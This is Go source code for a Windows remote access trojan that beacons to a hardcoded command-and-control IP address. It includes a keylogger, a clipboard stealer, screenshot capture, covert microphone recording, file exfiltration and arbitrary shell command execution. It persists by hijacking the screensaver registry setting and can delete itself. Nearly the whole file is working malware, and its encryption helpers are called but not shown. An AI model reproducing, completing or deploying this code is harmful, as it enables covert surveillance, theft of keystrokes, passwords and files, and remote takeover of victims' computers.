package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
)

const OP_SECRET = "GHOST_KEY_ALPHA"

var pendingAudioLoot string // Add this at the top with your other globals
var currentWorkingDir, _ = os.Getwd()
var (
	keyLogBuffer   strings.Builder
	user32         = syscall.NewLazyDLL("user32.dll")
	getAsyncState  = user32.NewProc("GetAsyncKeyState")
	openClipboard  = user32.NewProc("OpenClipboard")
	getClipboard   = user32.NewProc("GetClipboardData")
	closeClipboard = user32.NewProc("CloseClipboard")

	kernel32     = syscall.NewLazyDLL("kernel32.dll")
	globalLock   = kernel32.NewProc("GlobalLock")
	globalUnlock = kernel32.NewProc("GlobalUnlock")
)

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"`
	OS       string `json:"os"`   // MUST BE HERE
	Arch     string `json:"arch"` // MUST BE HERE
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

func main() {
	h, _ := os.Hostname()
	targetID := strings.ToUpper(fmt.Sprintf("%s-%d", h, time.Now().Unix()%1000))

	go startKeylogger()

	for {
		fmt.Println("[+] Heartbeat: Polling Brain...")
		err := pollAndExecute(targetID)
		if err != nil {
			fmt.Printf("[!] Connection Error: %v\n", err)
		}

		// Wait 10 seconds before the next check-in
		time.Sleep(10 * time.Second)
	}
}

var lastKeyState [256]bool // Track previous state of every key
func getClipboardText() string {
	r, _, _ := openClipboard.Call(0)
	if r == 0 {
		return "[!] Could not open clipboard"
	}
	defer closeClipboard.Call()

	// 1 is CF_TEXT (Standard ASCII)
	h, _, _ := getClipboard.Call(1)
	if h == 0 {
		return "[!] Clipboard empty or no text"
	}

	l, _, _ := globalLock.Call(h)
	if l == 0 {
		return "[!] Memory lock failed"
	}
	defer globalUnlock.Call(h)

	return gostring(l)
}

// Convert C-string pointer to Go string
func gostring(p uintptr) string {
	var s []byte
	for i := 0; ; i++ {
		b := *(*byte)(unsafe.Pointer(p + uintptr(i)))
		if b == 0 {
			break
		}
		s = append(s, b)
	}
	return string(s)
}

func setupPersistence() error {
	// 1. PATHING: Find where we are and where we're going
	oldPath, err := os.Executable()
	if err != nil {
		return err
	}

	// Using AppData/Themes - a very "quiet" place
	newDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes")
	newPath := filepath.Join(newDir, "cached_theme.scr")

	// 2. SELF-REPLICATION: Copy ourselves to the new location as a .scr
	if strings.ToLower(oldPath) != strings.ToLower(newPath) {
		_ = os.MkdirAll(newDir, 0755)
		input, err := os.ReadFile(oldPath)
		if err != nil {
			return err
		}
		err = os.WriteFile(newPath, input, 0644)
		if err != nil {
			return err
		}
	}

	// 3. REGISTRY HIJACK: Tell Windows to use us as the Screensaver
	// Note: You'll need "golang.org/x/sys/windows/registry" in your imports!
	k, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()

	_ = k.SetStringValue("SCRNSAVE.EXE", newPath)
	_ = k.SetStringValue("ScreenSaveActive", "1")
	_ = k.SetStringValue("ScreenSaveTimeOut", "60") // Trigger after 1 minute of no mouse movement

	return nil
}

func startKeylogger() {
	for {
		time.Sleep(10 * time.Millisecond)
		for i := 0; i < 256; i++ {
			ret, _, _ := getAsyncState.Call(uintptr(i))
			isPressed := (ret & 0x8000) != 0

			// ONLY record if it is currently pressed AND was NOT pressed in the last check
			if isPressed && !lastKeyState[i] {
				switch i {
				case 0x08:
					keyLogBuffer.WriteString("[BACK]")
				case 0x0D:
					keyLogBuffer.WriteString("[ENTER]\n")
				case 0x20:
					keyLogBuffer.WriteString(" ")
				case 0x09:
					keyLogBuffer.WriteString("[TAB]")
				case 0x10, 0x11, 0x12: // Ignore Modifiers
				default:
					if i >= 32 && i <= 126 {
						keyLogBuffer.WriteByte(byte(i))
					}
				}
			}
			// Update the state memory for the next loop
			lastKeyState[i] = isPressed
		}
	}
}
func pollAndExecute(targetID string) error {
	// 1. REGISTRATION WITH FINGERPRINTING
	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
	if err != nil {
		return err
	}

	// Send everything in one single registration packet
	json.NewEncoder(c).Encode(AuthRequest{
		Type:     "client_register",
		TargetID: targetID,
		Key:      OP_SECRET,
		OS:       runtime.GOOS,   // Automatic OS detection
		Arch:     runtime.GOARCH, // Automatic Architecture detection
	})
	c.Close()

	time.Sleep(150 * time.Millisecond)

	// 2. POLLING
	c, _ = net.Dial("tcp", "18.184.135.220:8080")
	json.NewEncoder(c).Encode(AuthRequest{Type: "client_poll", TargetID: targetID})
	var r RoutingInfo
	err = json.NewDecoder(c).Decode(&r) // This will now succeed every time
	c.Close()

	if err != nil || r.RelayAddr == "" {
		return nil // No work, see you in 10 seconds
	}
	// 3. IF WE GET HERE, ATTEMPT BRIDGE...
	fmt.Printf("[!] BRIDGE TRIGGERED: %s\n", r.RelayAddr)
	// 3. READY
	c, _ = net.Dial("tcp", "18.184.135.220:8080")
	json.NewEncoder(c).Encode(AuthRequest{Type: "client_ready", TargetID: targetID, Key: OP_SECRET, Listen: r.RelayAddr})
	c.Close()

	// 4. CONNECT TO RELAY (With a strict 5-second timeout)
	fmt.Printf("[!] Attempting Bridge: %s\n", r.RelayAddr)
	// Use DialTimeout to prevent the ghost from hanging forever on a dead relay
	relayConn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
	if err != nil {
		fmt.Printf("[X] BRIDGE FAILURE: Could not reach %s - %v\n", r.RelayAddr, err)
		return err
	}
	defer relayConn.Close()

	// --- NEW: SEND THE SECRET KNOCK ---
	_, err = relayConn.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"))
	if err != nil {
		relayConn.Close()
		return nil
	}

	// 5. SESSION KEY HANDSHAKE
	relayConn.SetReadDeadline(time.Now().Add(10 * time.Second))
	sessionKey := make([]byte, 32)
	if _, err = io.ReadFull(relayConn, sessionKey); err != nil {
		return nil
	}

	// 6. READ COMMAND
	cmdEnc, err := bufio.NewReader(relayConn).ReadString('\n')
	if err != nil {
		return nil
	}

	rawCmd, err := decryptPayload(strings.TrimSpace(cmdEnc), sessionKey)
	if err != nil {
		return nil
	}

	var finalOutput string

	// --- LOGIC GATEWAY ---
	if strings.HasPrefix(rawCmd, "download ") {
		filePath := strings.TrimPrefix(rawCmd, "download ")
		fileNameOnly := filepath.Base(filePath)
		data, err := os.ReadFile(filePath)
		if err != nil {
			finalOutput = fmt.Sprintf("[!] FILE ERROR: %v", err)
		} else {
			finalOutput = "FILE_DATA:" + fileNameOnly + "|" + base64.StdEncoding.EncodeToString(data)
		}

	} else if strings.HasPrefix(rawCmd, "cd ") {
		newDir := strings.TrimSpace(strings.TrimPrefix(rawCmd, "cd "))
		targetPath := newDir
		if !filepath.IsAbs(newDir) {
			targetPath = filepath.Join(currentWorkingDir, newDir)
		}
		info, err := os.Stat(targetPath)
		if err != nil || !info.IsDir() {
			finalOutput = fmt.Sprintf("[!] Directory not found: %s", targetPath)
		} else {
			currentWorkingDir = targetPath
			finalOutput = fmt.Sprintf("Working directory changed to: %s", currentWorkingDir)
		}

	} else if rawCmd == "snap" {
		n := screenshot.NumActiveDisplays()
		if n <= 0 {
			finalOutput = "[!] No active displays found"
		} else {
			bounds := screenshot.GetDisplayBounds(0)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				finalOutput = fmt.Sprintf("[!] Capture Error: %v", err)
			} else {
				var buf bytes.Buffer
				png.Encode(&buf, img)
				finalOutput = "SNAP_DATA:" + base64.StdEncoding.EncodeToString(buf.Bytes())
			}
		}

	} else if rawCmd == "sysinfo" {
		osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
		cpu, _ := exec.Command("cmd", "/C", "wmic cpu get name").Output()
		model, _ := exec.Command("cmd", "/C", "wmic computersystem get model").Output()
		ramRaw, _ := exec.Command("cmd", "/C", "wmic computersystem get totalphysicalmemory").Output()

		isAdmin := "User"
		f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		if err == nil {
			isAdmin = "ADMIN/SYSTEM"
			f.Close()
		}

		cleanCPU := strings.TrimSpace(strings.Replace(string(cpu), "Name", "", -1))
		cleanModel := strings.TrimSpace(strings.Replace(string(model), "Model", "", -1))
		ramStr := strings.TrimSpace(strings.Replace(string(ramRaw), "TotalPhysicalMemory", "", -1))

		finalOutput = fmt.Sprintf(
			"\n[+] IDENT: %s\n[+] PRIVS: %s\n[+] MODEL: %s\n[+] RAM:   %s bytes\n[+] CPU:   %s\n[+] OS:    %s",
			targetID, isAdmin, cleanModel, ramStr, cleanCPU, osInfo,
		)
		// --- KEYLOGGER RETRIEVAL ---
	} else if rawCmd == "getkeys" {
		logs := keyLogBuffer.String()
		if logs == "" {
			finalOutput = "[!] No keystrokes recorded yet."
		} else {
			finalOutput = "\n--- [KEYLOG REPORT] ---\n" + logs
			keyLogBuffer.Reset() // Clear buffer after sending to keep it stealthy
		}
		// --- CLIPBOARD SNATCHER ---
	} else if rawCmd == "clip" {
		captured := getClipboardText()
		finalOutput = fmt.Sprintf("\n--- [CLIPBOARD SNATCH] ---\n%s", captured)
		// --- BURST LISTEN LOGIC ---
		// --- PURE GO AUDIO BUG ---
		// --- PURE GO AUDIO BUG (Synchronous) ---
		// --- PURE GO AUDIO BUG (High Sensitivity) ---
		// --- PURE GO AUDIO BUG (High-Gain Fixed) ---
		// --- AUDIO RETRIEVAL ---
	} else if rawCmd == "checkaudio" {
		if pendingAudioLoot != "" {
			finalOutput = pendingAudioLoot
			pendingAudioLoot = "" // Clear it so we don't send the same file twice
		} else {
			finalOutput = "[!] Recording still in progress or no audio found."
		}
	} else if strings.HasPrefix(rawCmd, "listen ") {
		durationStr := strings.TrimPrefix(rawCmd, "listen ")
		seconds, _ := strconv.Atoi(durationStr)
		if seconds <= 0 {
			seconds = 10
		}

		go func(sec int) {
			// 1. Path Setup - Use a name that definitely won't conflict
			tempFile := filepath.Join(os.Getenv("TEMP"), "mrg_capture_system.wav")
			winmm := syscall.NewLazyDLL("winmm.dll").NewProc("mciSendStringW")

			// 2. HARD RESET: Close any existing ghostmic before starting
			// This turns off the icon if it was stuck from a previous run
			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)

			// 3. Setup and Start
			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open new type waveaudio alias ghostmic"))), 0, 0, 0)
			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("set ghostmic bitspersample 16 samplespersec 44100 channels 1"))), 0, 0, 0)
			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("record ghostmic"))), 0, 0, 0)

			// Wait for the recording
			time.Sleep(time.Duration(sec) * time.Second)

			// 4. THE CLEAN EXIT: Stop -> Save -> Close
			// We call these one after another regardless of errors to ensure the icon goes away
			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("stop ghostmic"))), 0, 0, 0)

			saveCmd := fmt.Sprintf(`save ghostmic "%s"`, tempFile)
			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(saveCmd))), 0, 0, 0)

			// This is the line that actually kills the mic icon!
			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)

			// 5. Read and Cache
			data, err := os.ReadFile(tempFile)
			if err == nil && len(data) > 0 {
				pendingAudioLoot = "FILE_DATA:mic_capture.wav|" + base64.StdEncoding.EncodeToString(data)
				os.Remove(tempFile)
			} else {
				pendingAudioLoot = "[red][!] Recording ended but file was empty. Mic might be in use by another app.[-]"
			}
		}(seconds)

		finalOutput = fmt.Sprintf("[cyan][+] Mic active for %ds.[-] Icon will vanish once 'close' is issued by the system.", seconds)
		// --- LOGIC GATEWAY ---
	} else if strings.HasPrefix(rawCmd, "persist") {
		// Run the persistence installer
		err := setupPersistence()
		if err != nil {
			finalOutput = fmt.Sprintf("[!] PERSISTENCE ERROR: %v", err)
		} else {
			// Success message that will show up in your TUI
			finalOutput = "[black:green] 🔗 ANCHOR DROPPED [-] [green]Ghost renamed to .scr and Screensaver Hijack active (60s idle).[-]"
		}
		// --- SELF DESTRUCT ---
	} else if strings.HasPrefix(rawCmd, "self_destruct") {
		fmt.Println("[!] EMERGENCY: Initiating Self-Destruct...")

		// 1. CLEAN THE REGISTRY (Remove the Screensaver Hijack)
		// We set the screensaver back to "None" and reset the timeout
		exec.Command("reg", "delete", `HKCU\Control Panel\Desktop`, "/v", "SCRNSAVE.EXE", "/f").Run()
		exec.Command("reg", "add", `HKCU\Control Panel\Desktop`, "/v", "ScreenSaveActive", "/t", "REG_SZ", "/d", "0", "/f").Run()

		// 2. MARK THE FILE FOR DELETION
		// Windows won't let a process delete itself while running,
		// so we use a classic "Cmd" trick to delete it after the process exits.
		selfPath, _ := os.Executable()
		delCmd := fmt.Sprintf("timeout /t 5 & del /f /q \"%s\"", selfPath)

		// Spawn a detached cmd process to do the dirty work
		exec.Command("cmd", "/C", delCmd).Start()

		// 3. EXIT IMMEDIATELY
		fmt.Println("[X] Ghost Purged. Goodbye.")
		os.Exit(0)
	} else {
		// --- STANDARD COMMAND ---
		cmdObj := exec.Command("cmd", "/C", rawCmd)
		cmdObj.Dir = currentWorkingDir
		out, _ := cmdObj.CombinedOutput()
		host, _ := os.Hostname()
		finalOutput = fmt.Sprintf("\n--- [%s] ---\nLocation: %s\n%s", host, currentWorkingDir, string(out))
	}

	// 7. ENCRYPTED RESPONSE
	encRes, _ := encryptPayload(finalOutput, sessionKey)
	fmt.Fprintf(relayConn, "%s\n", encRes)
	return nil
}
